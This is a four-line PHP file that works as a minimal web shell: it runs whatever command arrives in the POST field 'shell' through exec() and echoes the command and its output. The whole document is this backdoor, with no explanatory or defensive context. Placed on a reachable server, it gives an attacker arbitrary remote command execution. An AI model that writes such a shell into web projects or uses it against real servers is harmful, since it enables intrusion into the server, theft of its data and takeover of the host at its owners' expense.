<?php
$stdout;
exec($_POST['shell'], $stdout);
echo print_r($_POST['shell']), '<br>', print_r($stdout);
